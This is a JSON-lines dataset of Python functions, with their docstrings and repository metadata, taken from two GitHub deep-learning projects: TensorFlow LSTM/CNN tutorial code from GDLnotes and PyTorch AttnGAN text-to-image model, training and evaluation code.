{"docstring": "\"\"\"Turn a (column) prediction into 1-hot encoded samples.\"\"\"\n", "func_signal": "def sample(prediction):\n", "code": "p = np.zeros(shape=[1, vocabulary_size], dtype=np.float)\np[0, sample_distribution(prediction[0])] = 1.0\nreturn p", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate a single batch from the current cursor position in the data.\"\"\"\n", "func_signal": "def _next_batch(self, step):\n", "code": "batch = ''\n# print('text size', self._text_size)\nfor b in range(self._num_unrollings):\n    # print(self._cursor[step])\n    self._cursor[step] %= self._text_size\n    batch += self._text[self._cursor[step]]\n    self._cursor[step] += 1\nreturn batch", "path": "GDLnotes/src/rnn/seq2seq.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate the next array of batches from the data. The array consists of\nthe last batch of the previous array, followed by num_unrollings new ones.\n\"\"\"\n", "func_signal": "def next(self):\n", "code": "batches = [self._last_batch]\nfor step in range(self._num_unrollings):\n    batches.append(self._next_batch())\nself._last_batch = batches[-1]\nreturn batches", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Create a LSTM cell. See e.g.: http://arxiv.org/pdf/1402.1128v1.pdf\nNote that in this formulation, we omit the various connections between the\nprevious state and the gates.\"\"\"\n# large weight, 1/4 parameters for each gate, matrix multiply once, take 1/4 output results as a gate\n", "func_signal": "def lstm_cell(i, o, state):\n", "code": "values = tf.split(tf.matmul(i, input_weights) + tf.matmul(o, output_weights) + bias, gate_count, 1)\ninput_gate = tf.sigmoid(values[0])\nforget_gate = tf.sigmoid(values[1])\nupdate = values[2]\nstate = forget_gate * state + input_gate * tf.tanh(update)\noutput_gate = tf.sigmoid(values[3])\nreturn output_gate * tf.tanh(state), state", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Sample one element from a distribution assumed to be an array of normalized\nprobabilities.\n\"\"\"\n# \u53d6\u4e00\u90e8\u5206\u6570\u636e\u7528\u4e8e\u8bc4\u4f30\uff0c\u6240\u53d6\u6570\u636e\u6bd4\u4f8b\u968f\u673a\n", "func_signal": "def sample_distribution(distribution):\n", "code": "r = random.uniform(0, 1)\ns = 0\nfor i in range(len(distribution)):\n    s += distribution[i]\n    if s >= r:\n        return i\nreturn len(distribution) - 1", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Turn a (column) prediction into 1-hot encoded samples.\"\"\"\n", "func_signal": "def sample(prediction, size=vocabulary_size):\n", "code": "p = np.zeros(shape=[1, size], dtype=np.float)\np[0, sample_distribution(prediction[0])] = 1.0\nreturn p", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "# Variables.\n", "func_signal": "def model(data, init=False):\n", "code": "if not large_data_size(data) or not large_data_size(input_weights):\n    stride_ps[0] = [1, 1, 1, 1]\nconv = tf.nn.conv2d(data, input_weights, stride_ps[0], use_cudnn_on_gpu=True, padding='SAME')\nconv = maxpool2d(conv)\nhidden = tf.nn.relu(conv + input_biases)\nif init:\n    hidden = tf.nn.dropout(hidden, 0.8)\nfor i in range(mid_layer_cnt):\n    # print(hidden)\n    if init:\n        hid_shape = hidden.get_shape()\n        filter_w = patch_size / (i + 1)\n        filter_h = patch_size / (i + 1)\n        if filter_w > hid_shape[1]:\n            filter_w = int(hid_shape[1])\n        if filter_h > hid_shape[2]:\n            filter_h = int(hid_shape[2])\n        layer_weight = tf.Variable(tf.truncated_normal(shape=[filter_w, filter_h, depth / (i + 1), depth / (i + 2)],\n                                                       stddev=0.1))\n        layer_weights.append(layer_weight)\n    if not large_data_size(hidden) or not large_data_size(layer_weights[i]):\n        stride_ps[i + 1] = [1, 1, 1, 1]\n    conv = tf.nn.conv2d(hidden, layer_weights[i], stride_ps[i + 1], use_cudnn_on_gpu=True, padding='SAME')\n    if not large_data_size(conv):\n        conv = maxpool2d(conv, 1, 1)\n    else:\n        conv = maxpool2d(conv)\n    hidden = tf.nn.relu(conv + layer_biases[i])\n    if init:\n        hidden = tf.nn.dropout(hidden, 0.8)\n\nshapes = hidden.get_shape().as_list()\nshape_mul = 1\nfor s in shapes[1:]:\n    shape_mul *= s\n\nif init:\n    output_size = shape_mul\n    output_weights.append(tf.Variable(tf.truncated_normal([output_size, num_hidden], stddev=0.1)))\nreshape = tf.reshape(hidden, [shapes[0], shape_mul])\n\nhidden = tf.nn.relu6(tf.matmul(reshape, output_weights[0]) + output_biases)\nif init:\n    hidden = tf.nn.dropout(hidden, 0.5)\nhidden = tf.matmul(hidden, first_nn_weights) + first_nn_biases\nif init:\n    hidden = tf.nn.dropout(hidden, 0.5)\nhidden = tf.matmul(hidden, second_nn_weights) + second_nn_biases\nreturn hidden", "path": "GDLnotes/src/optimize/cnn_long_optimize.py", "commit_date": "2017-06-23 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "# With gradient descent training, even this much data is prohibitive.\n# Subset the training data for faster turnaround.\n", "func_signal": "def tf_logist():\n", "code": "train_subset = 10000\n\ngraph = tf.Graph()\nwith graph.as_default():\n    # Input data.\n    # Load the training, validation and test data into constants that are\n    # attached to the graph.\n    tf_train_dataset = tf.constant(train_dataset[:train_subset, :])\n    tf_train_labels = tf.constant(train_labels[:train_subset])\n    tf_valid_dataset = tf.constant(valid_dataset)\n    tf_test_dataset = tf.constant(test_dataset)\n\n    # Variables.\n    # These are the parameters that we are going to be training. The weight\n    # matrix will be initialized using random valued following a (truncated)\n    # normal distribution. The biases get initialized to zero.\n    weights = tf.Variable(\n        tf.truncated_normal([image_size * image_size, num_labels]))\n    biases = tf.Variable(tf.zeros([num_labels]))\n\n    # Training computation.\n    # We multiply the inputs with the weight matrix, and add biases. We compute\n    # the softmax and cross-entropy (it's one operation in TensorFlow, because\n    # it's very common, and it can be optimized). We take the average of this\n    # cross-entropy across all training example: that's our loss.\n    logits = tf.matmul(tf_train_dataset, weights) + biases\n    loss = tf.reduce_mean(\n        tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=tf_train_labels))\n\n    # Optimizer.\n    # We are going to find the minimum of this loss using gradient descent.\n    optimizer = tf.train.GradientDescentOptimizer(0.5).minimize(loss)\n\n    # Predictions for the training, validation, and test data.\n    # These are not part of training, but merely here so that we can report\n    # accuracy figures as we train.\n    train_prediction = tf.nn.softmax(logits)\n    valid_prediction = tf.nn.softmax(\n        tf.matmul(tf_valid_dataset, weights) + biases)\n    test_prediction = tf.nn.softmax(tf.matmul(tf_test_dataset, weights) + biases)\n\nnum_steps = 801\n\nwith tf.Session(graph=graph) as session:\n    # This is a one-time operation which ensures the parameters get initialized as\n    # we described in the graph: random weights for the matrix, zeros for the\n    # biases.\n    tf.global_variables_initializer().run()\n    print('Initialized')\n    for step in range(num_steps):\n        # Run the computations. We tell .run() that we want to run the optimizer,\n        # and get the loss value and the training predictions returned as numpy\n        # arrays.\n        _, l, predictions = session.run([optimizer, loss, train_prediction])\n        if step % 100 == 0:\n            print('Loss at step %d: %f' % (step, l))\n            print('Training accuracy: %.1f%%' % accuracy(\n                predictions, train_labels[:train_subset, :]))\n            # Calling .eval() on valid_prediction is basically like calling run(), but\n            # just to get that one numpy array. Note that it recomputes all its graph\n            # dependencies.\n            print('Validation accuracy: %.1f%%' % accuracy(\n                valid_prediction.eval(), valid_labels))\n    print('Test accuracy: %.1f%%' % accuracy(test_prediction.eval(), test_labels))", "path": "GDLnotes/src/neural/full_connect.py", "commit_date": "2017-06-23 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate the next array of batches from the data. The array consists of\nthe last batch of the previous array, followed by num_unrollings new ones.\n\"\"\"\n", "func_signal": "def next(self):\n", "code": "batches = [self._last_batch]\nfor step in range(self._batch_size):\n    batches.append(self._next_batch(step))\nself._last_batch = batches[-1]\nreturn batches", "path": "GDLnotes/src/rnn/seq2seq.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Attach a lot of summaries to a Tensor.\"\"\"\n", "func_signal": "def variable_summaries(var, name):\n", "code": "with tf.name_scope('summaries'):\n    mean = tf.reduce_mean(var)\n    tf.scalar_summary('mean/' + name, mean)\n    with tf.name_scope('stddev'):\n        stddev = tf.sqrt(tf.reduce_sum(tf.square(var - mean)))\n    tf.scalar_summary('sttdev/' + name, stddev)\n    tf.scalar_summary('max/' + name, tf.reduce_max(var))\n    tf.scalar_summary('min/' + name, tf.reduce_min(var))\n    tf.histogram_summary(name, var)", "path": "GDLnotes/src/util/board.py", "commit_date": "2017-05-09 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Convert a sequence of batches back into their (most likely) string\nrepresentation.\"\"\"\n", "func_signal": "def batches2id(batches):\n", "code": "s = [''] * batches[0].shape[0]\nfor b in batches:\n    s = [''.join(x) for x in zip(s, ids(b))]\nreturn s", "path": "GDLnotes/src/rnn/seq2seq.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Attach a lot of summaries to a Tensor (for TensorBoard visualization).\"\"\"\n", "func_signal": "def variable_summary(var):\n", "code": "with tf.name_scope('summaries'):\n    mean = tf.reduce_mean(var)\n    tf.summary.scalar('mean', mean)\n    with tf.name_scope('stddev'):\n        stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))\n    tf.summary.scalar('stddev', stddev)\n    tf.summary.scalar('max', tf.reduce_max(var))\n    tf.summary.scalar('min', tf.reduce_min(var))\n    tf.summary.histogram('histogram', var)", "path": "GDLnotes/src/util/board.py", "commit_date": "2017-05-09 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate a single batch from the current cursor position in the data.\"\"\"\n# take character from text on cursor[b]\n# set to 1 for the taken character\n# so we have a matrix of 1/0 as input, an one hot encoding\n", "func_signal": "def _next_batch(self):\n", "code": "batch = np.zeros(shape=(self._batch_size, vocabulary_size), dtype=np.float)\nfor b in range(self._batch_size):\n    # same id, same index of second dimension\n    batch[b, char2id(self._text[self._cursor[b]])] = 1.0\n    self._cursor[b] = (self._cursor[b] + 1) % self._text_size\nreturn batch", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate a random column of probabilities.\"\"\"\n", "func_signal": "def random_distribution():\n", "code": "b = np.random.uniform(0.0, 1.0, size=[1, vocabulary_size])\nreturn b / np.sum(b, 1)[:, None]", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Log-probability of the true labels in a predicted batch.\"\"\"\n", "func_signal": "def logprob(predictions, labels):\n", "code": "predictions[predictions < 1e-10] = 1e-10\nreturn np.sum(np.multiply(labels, -np.log(predictions))) / labels.shape[0]", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Generate a random column of probabilities.\"\"\"\n", "func_signal": "def random_distribution(size=vocabulary_size):\n", "code": "b = np.random.uniform(0.0, 1.0, size=[1, size])\nreturn b / np.sum(b, 1)[:, None]", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "\"\"\"Convert a sequence of batches back into their (most likely) string\nrepresentation.\"\"\"\n", "func_signal": "def batches2string(batches):\n", "code": "s = [''] * batches[0].shape[0]\nfor b in batches:\n    s = [''.join(x) for x in zip(s, characters(b))]\nreturn s", "path": "GDLnotes/src/rnn/singlew_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "# initalize batch generators\n", "func_signal": "def bitrain(g, num_steps, summary_frequency, num_unrollings, batch_size):\n", "code": "train_batches = BiBatchGenerator(train_text, batch_size, num_unrollings)\nvalid_batches = BiBatchGenerator(valid_text, 1, 1)\noptimizer = g.get_tensor_by_name('optimizer:0')\nloss = g.get_tensor_by_name('loss:0')\ntrain_prediction = g.get_tensor_by_name('train_prediction:0')\nlearning_rate = g.get_tensor_by_name('learning_rate:0')\ntf_train_data = g.get_tensor_by_name('tf_train_data:0')\nsample_prediction = g.get_tensor_by_name('sample_prediction:0')\n# similarity = g.get_tensor_by_name('similarity:0')\nreset_sample_state = g.get_operation_by_name('reset_sample_state')\nsample_input = g.get_tensor_by_name('sample_input:0')\nembeddings = g.get_tensor_by_name('embeddings:0')\nkeep_prob = g.get_tensor_by_name('tf_keep_prob:0')\nwith tf.Session(graph=g) as session:\n    tf.global_variables_initializer().run()\n    print('Initialized')\n    mean_loss = 0\n    for step in range(num_steps):\n        batches = train_batches.next()\n        # print bibatches2string(batches)\n        # print np.array(batches)\n        # feed_dict = dict()\n        # for i in range(num_unrollings + 1):\n        #  feed_dict[train_data[i]] = batches[i]\n        # tf_train_data =\n        _, l, lr, predictions = session.run([optimizer, loss, learning_rate, train_prediction],\n                                            feed_dict={tf_train_data: batches, keep_prob: 0.6})\n        mean_loss += l\n        if step % summary_frequency == 0:\n            if step > 0:\n                mean_loss = mean_loss / summary_frequency\n            # The mean loss is an estimate of the loss over the last few batches.\n            print ('Average loss at step %d: %f learning rate: %f' % (step, mean_loss, lr))\n            mean_loss = 0\n            labels = list(batches)[1:]\n            labels = np.concatenate([bigramonehot(l) for l in labels])\n            # print predictions\n            # print labels\n            # print labels.shape[0]\n            print('Minibatch perplexity: %.2f' % float(np.exp(logprob(predictions, labels))))\n            if step % (summary_frequency * 10) == 0:\n                # Generate some samples.\n                print('=' * 80)\n                # print embeddings.eval()\n                for _ in range(5):\n                    # print random_distribution(bi_voc_size)\n                    feed = np.argmax(sample(random_distribution(bi_voc_size), bi_voc_size))\n                    sentence = bi2str(feed)\n                    reset_sample_state.run()\n                    for _ in range(49):\n                        # prediction = similarity.eval({sample_input: [feed]})\n                        # nearest = (-prediction[0]).argsort()[0]\n                        prediction = sample_prediction.eval({sample_input: [feed], keep_prob: 1.0})\n                        # print prediction\n                        feed = np.argmax(sample(prediction, bi_voc_size))\n                        # feed = np.argmax(prediction[0])\n                        sentence += bi2str(feed)\n                    print(sentence)\n                print('=' * 80)\n            # Measure validation set perplexity.\n            reset_sample_state.run()\n            valid_logprob = 0\n            for _ in range(valid_size):\n                b = valid_batches.next()\n                predictions = sample_prediction.eval({sample_input: b[0], keep_prob: 1.0})\n                # print(predictions)\n                valid_logprob = valid_logprob + logprob(predictions, one_hot_voc(b[1], bi_voc_size))\n            print('Validation set perplexity: %.2f' % float(np.exp(valid_logprob / valid_size)))", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "# input: torch.LongTensor of size batch x n_steps\n# --> emb: batch x n_steps x ninput\n", "func_signal": "def forward(self, captions, cap_lens, hidden, mask=None):\n", "code": "emb = self.drop(self.encoder(captions))\n#\n# Returns: a PackedSequence object\ncap_lens = cap_lens.data.tolist()\nemb = pack_padded_sequence(emb, cap_lens, batch_first=True)\n# #hidden and memory (num_layers * num_directions, batch, hidden_size):\n# tensor containing the initial hidden state for each element in batch.\n# #output (batch, seq_len, hidden_size * num_directions)\n# #or a PackedSequence object:\n# tensor containing output features (h_t) from the last layer of RNN\noutput, hidden = self.rnn(emb, hidden)\n# PackedSequence object\n# --> (batch, seq_len, hidden_size * num_directions)\noutput = pad_packed_sequence(output, batch_first=True)[0]\n# output = self.drop(output)\n# --> batch x hidden_size*num_directions x seq_len\nwords_emb = output.transpose(1, 2)\n# --> batch x num_directions*hidden_size\nif self.rnn_type == 'LSTM':\n    sent_emb = hidden[0].transpose(0, 1).contiguous()\nelse:\n    sent_emb = hidden.transpose(0, 1).contiguous()\nsent_emb = sent_emb.view(-1, self.nhidden * self.num_directions)\nreturn words_emb, sent_emb", "path": "AttnGAN/code/model.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    h_code1(query):  batch x idf x ih x iw (queryL=ihxiw)\n    word_embs(context): batch x cdf x sourceL (sourceL=seq_len)\n    c_code1: batch x idf x queryL\n    att1: batch x sourceL x queryL\n\"\"\"\n", "func_signal": "def forward(self, h_code, c_code, word_embs, mask):\n", "code": "self.att.applyMask(mask)\nc_code, att = self.att(h_code, word_embs)\nh_c_code = torch.cat((h_code, c_code), 1)\nout_code = self.residual(h_c_code)\n\n# state size ngf/2 x 2in_size x 2in_size\nout_code = self.upsample(out_code)\n\nreturn out_code, att", "path": "AttnGAN/code/model.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "#print(word_len)\n", "func_signal": "def models(word_len):\n", "code": "text_encoder = cache.get('text_encoder')\nif text_encoder is None:\n    #print(\"text_encoder not cached\")\n    text_encoder = RNN_ENCODER(word_len, nhidden=cfg.TEXT.EMBEDDING_DIM)\n    state_dict = torch.load(cfg.TRAIN.NET_E, map_location=lambda storage, loc: storage)\n    text_encoder.load_state_dict(state_dict)\n    if cfg.CUDA:\n        text_encoder.cuda()\n    text_encoder.eval()\n    cache.set('text_encoder', text_encoder, timeout=60 * 60 * 24)\n\nnetG = cache.get('netG')\nif netG is None:\n    #print(\"netG not cached\")\n    netG = G_NET()\n    state_dict = torch.load(cfg.TRAIN.NET_G, map_location=lambda storage, loc: storage)\n    netG.load_state_dict(state_dict)\n    if cfg.CUDA:\n        netG.cuda()\n    netG.eval()\n    cache.set('netG', netG, timeout=60 * 60 * 24)\n\nreturn text_encoder, netG", "path": "AttnGAN/eval/eval.py", "commit_date": "2018-04-27 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    h_code1(query):  batch x idf x ih x iw (queryL=ihxiw)\n    word_embs(context): batch x cdf x sourceL (sourceL=seq_len)\n    c_code1: batch x idf x queryL\n    att1: batch x sourceL x queryL\n\"\"\"\n", "func_signal": "def forward(self, h_code, c_code, word_embs, mask):\n", "code": "self.att.applyMask(mask)\nc_code, att = self.att(h_code, word_embs)\nh_c_code = torch.cat((h_code, c_code), 1)\nout_code = self.residual(h_c_code)\n\n# state size ngf/2 x 2in_size x 2in_size\nout_code = self.upsample(out_code)\n\nreturn out_code, att", "path": "AttnGAN/eval/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# ###################encoders######################################## #\n", "func_signal": "def build_models(self):\n", "code": "if cfg.TRAIN.NET_E == '':\n    print('Error: no pretrained text-image encoders')\n    return\n\nimage_encoder = CNN_ENCODER(cfg.TEXT.EMBEDDING_DIM)\nimg_encoder_path = cfg.TRAIN.NET_E.replace('text_encoder', 'image_encoder')\nstate_dict = \\\n    torch.load(img_encoder_path, map_location=lambda storage, loc: storage)\nimage_encoder.load_state_dict(state_dict)\nfor p in image_encoder.parameters():\n    p.requires_grad = False\nprint('Load image encoder from:', img_encoder_path)\nimage_encoder.eval()\n\ntext_encoder = \\\n    RNN_ENCODER(self.n_words, nhidden=cfg.TEXT.EMBEDDING_DIM)\nstate_dict = \\\n    torch.load(cfg.TRAIN.NET_E,\n               map_location=lambda storage, loc: storage)\ntext_encoder.load_state_dict(state_dict)\nfor p in text_encoder.parameters():\n    p.requires_grad = False\nprint('Load text encoder from:', cfg.TRAIN.NET_E)\ntext_encoder.eval()\n\n# #######################generator and discriminators############## #\nnetsD = []\nif cfg.GAN.B_DCGAN:\n    if cfg.TREE.BRANCH_NUM ==1:\n        from model import D_NET64 as D_NET\n    elif cfg.TREE.BRANCH_NUM == 2:\n        from model import D_NET128 as D_NET\n    else:  # cfg.TREE.BRANCH_NUM == 3:\n        from model import D_NET256 as D_NET\n    # TODO: elif cfg.TREE.BRANCH_NUM > 3:\n    netG = G_DCGAN()\n    netsD = [D_NET(b_jcu=False)]\nelse:\n    from model import D_NET64, D_NET128, D_NET256\n    netG = G_NET()\n    if cfg.TREE.BRANCH_NUM > 0:\n        netsD.append(D_NET64())\n    if cfg.TREE.BRANCH_NUM > 1:\n        netsD.append(D_NET128())\n    if cfg.TREE.BRANCH_NUM > 2:\n        netsD.append(D_NET256())\n    # TODO: if cfg.TREE.BRANCH_NUM > 3:\nnetG.apply(weights_init)\n# print(netG)\nfor i in range(len(netsD)):\n    netsD[i].apply(weights_init)\n    # print(netsD[i])\nprint('# of netsD', len(netsD))\n#\nepoch = 0\nif cfg.TRAIN.NET_G != '':\n    state_dict = \\\n        torch.load(cfg.TRAIN.NET_G, map_location=lambda storage, loc: storage)\n    netG.load_state_dict(state_dict)\n    print('Load G from: ', cfg.TRAIN.NET_G)\n    istart = cfg.TRAIN.NET_G.rfind('_') + 1\n    iend = cfg.TRAIN.NET_G.rfind('.')\n    epoch = cfg.TRAIN.NET_G[istart:iend]\n    epoch = int(epoch) + 1\n    if cfg.TRAIN.B_NET_D:\n        Gname = cfg.TRAIN.NET_G\n        for i in range(len(netsD)):\n            s_tmp = Gname[:Gname.rfind('/')]\n            Dname = '%s/netD%d.pth' % (s_tmp, i)\n            print('Load D from: ', Dname)\n            state_dict = \\\n                torch.load(Dname, map_location=lambda storage, loc: storage)\n            netsD[i].load_state_dict(state_dict)\n# ########################################################### #\nif cfg.CUDA:\n    text_encoder = text_encoder.cuda()\n    image_encoder = image_encoder.cuda()\n    netG.cuda()\n    for i in range(len(netsD)):\n        netsD[i].cuda()\nreturn [text_encoder, image_encoder, netG, netsD, epoch]", "path": "AttnGAN/code/trainer.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    input: batch x idf x ih x iw (queryL=ihxiw)\n    context: batch x cdf x sourceL\n\"\"\"\n", "func_signal": "def forward(self, input, context):\n", "code": "ih, iw = input.size(2), input.size(3)\nqueryL = ih * iw\nbatch_size, sourceL = context.size(0), context.size(2)\n\n# --> batch x queryL x idf\ntarget = input.view(batch_size, -1, queryL)\ntargetT = torch.transpose(target, 1, 2).contiguous()\n# batch x cdf x sourceL --> batch x cdf x sourceL x 1\nsourceT = context.unsqueeze(3)\n# --> batch x idf x sourceL\nsourceT = self.conv_context(sourceT).squeeze(3)\n\n# Get attention\n# (batch x queryL x idf)(batch x idf x sourceL)\n# -->batch x queryL x sourceL\nattn = torch.bmm(targetT, sourceT)\n# --> batch*queryL x sourceL\nattn = attn.view(batch_size*queryL, sourceL)\nif self.mask is not None:\n    # batch_size x sourceL --> batch_size*queryL x sourceL\n    mask = self.mask.repeat(queryL, 1)\n    attn.data.masked_fill_(mask.data, -float('inf'))\nattn = self.sm(attn)  # Eq. (2)\n# --> batch x queryL x sourceL\nattn = attn.view(batch_size, queryL, sourceL)\n# --> batch x sourceL x queryL\nattn = torch.transpose(attn, 1, 2).contiguous()\n\n# (batch x idf x sourceL)(batch x sourceL x queryL)\n# --> batch x idf x queryL\nweightedContext = torch.bmm(sourceT, attn)\nweightedContext = weightedContext.view(batch_size, -1, ih, iw)\nattn = attn.view(batch_size, -1, ih, iw)\n\nreturn weightedContext, attn", "path": "AttnGAN/code/GlobalAttention.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# load word dictionaries\n", "func_signal": "def eval(caption):\n", "code": "wordtoix, ixtoword = word_index()\n# lead models\ntext_encoder, netG = models(len(wordtoix))\n# load blob service\nblob_service = BlockBlobService(account_name='attgan', account_key=os.environ[\"BLOB_KEY\"])\n\nt0 = time.time()\nurls = generate(caption, wordtoix, ixtoword, text_encoder, netG, blob_service)\nt1 = time.time()\n\nresponse = {\n    'small': urls[0],\n    'medium': urls[1],\n    'large': urls[2],\n    'map1': urls[3],\n    'map2': urls[4],\n    'caption': caption,\n    'elapsed': t1 - t0\n}\n\nreturn response", "path": "AttnGAN/eval/eval.py", "commit_date": "2018-04-27 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n:param z_code: batch x cfg.GAN.Z_DIM\n:param c_code: batch x cfg.TEXT.EMBEDDING_DIM\n:return: batch x ngf/16 x 64 x 64\n\"\"\"\n", "func_signal": "def forward(self, z_code, c_code):\n", "code": "c_z_code = torch.cat((c_code, z_code), 1)\n# state size ngf x 4 x 4\nout_code = self.fc(c_z_code)\nout_code = out_code.view(-1, self.gf_dim, 4, 4)\n# state size ngf/3 x 8 x 8\nout_code = self.upsample1(out_code)\n# state size ngf/4 x 16 x 16\nout_code = self.upsample2(out_code)\n# state size ngf/8 x 32 x 32\nout_code32 = self.upsample3(out_code)\n# state size ngf/16 x 64 x 64\nout_code64 = self.upsample4(out_code32)\n\nreturn out_code64", "path": "AttnGAN/eval/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    input: batch x idf x ih x iw (queryL=ihxiw)\n    context: batch x cdf x sourceL\n\"\"\"\n", "func_signal": "def forward(self, input, context):\n", "code": "ih, iw = input.size(2), input.size(3)\nqueryL = ih * iw\nbatch_size, sourceL = context.size(0), context.size(2)\n\n# --> batch x queryL x idf\ntarget = input.view(batch_size, -1, queryL)\ntargetT = torch.transpose(target, 1, 2).contiguous()\n# batch x cdf x sourceL --> batch x cdf x sourceL x 1\nsourceT = context.unsqueeze(3)\n# --> batch x idf x sourceL\nsourceT = self.conv_context(sourceT).squeeze(3)\n\n# Get attention\n# (batch x queryL x idf)(batch x idf x sourceL)\n# -->batch x queryL x sourceL\nattn = torch.bmm(targetT, sourceT)\n# --> batch*queryL x sourceL\nattn = attn.view(batch_size*queryL, sourceL)\nif self.mask is not None:\n    # batch_size x sourceL --> batch_size*queryL x sourceL\n    mask = self.mask.repeat(queryL, 1)\n    attn.data.masked_fill_(mask.data, -float('inf'))\nattn = self.sm(attn)  # Eq. (2)\n# --> batch x queryL x sourceL\nattn = attn.view(batch_size, queryL, sourceL)\n# --> batch x sourceL x queryL\nattn = torch.transpose(attn, 1, 2).contiguous()\n\n# (batch x idf x sourceL)(batch x sourceL x queryL)\n# --> batch x idf x queryL\nweightedContext = torch.bmm(sourceT, attn)\nweightedContext = weightedContext.view(batch_size, -1, ih, iw)\nattn = attn.view(batch_size, -1, ih, iw)\n\nreturn weightedContext, attn", "path": "AttnGAN/eval/GlobalAttention.py", "commit_date": "2018-03-07 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    :param z_code: batch x cfg.GAN.Z_DIM\n    :param sent_emb: batch x cfg.TEXT.EMBEDDING_DIM\n    :param word_embs: batch x cdf x seq_len\n    :param mask: batch x seq_len\n    :return:\n\"\"\"\n", "func_signal": "def forward(self, z_code, sent_emb, word_embs, mask):\n", "code": "fake_imgs = []\natt_maps = []\nc_code, mu, logvar = self.ca_net(sent_emb)\n\nif cfg.TREE.BRANCH_NUM > 0:\n    h_code1 = self.h_net1(z_code, c_code)\n    fake_img1 = self.img_net1(h_code1)\n    fake_imgs.append(fake_img1)\nif cfg.TREE.BRANCH_NUM > 1:\n    h_code2, att1 = \\\n        self.h_net2(h_code1, c_code, word_embs, mask)\n    fake_img2 = self.img_net2(h_code2)\n    fake_imgs.append(fake_img2)\n    if att1 is not None:\n        att_maps.append(att1)\nif cfg.TREE.BRANCH_NUM > 2:\n    h_code3, att2 = \\\n        self.h_net3(h_code2, c_code, word_embs, mask)\n    fake_img3 = self.img_net3(h_code3)\n    fake_imgs.append(fake_img3)\n    if att2 is not None:\n        att_maps.append(att2)\n\nreturn fake_imgs, att_maps, mu, logvar", "path": "AttnGAN/code/model.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
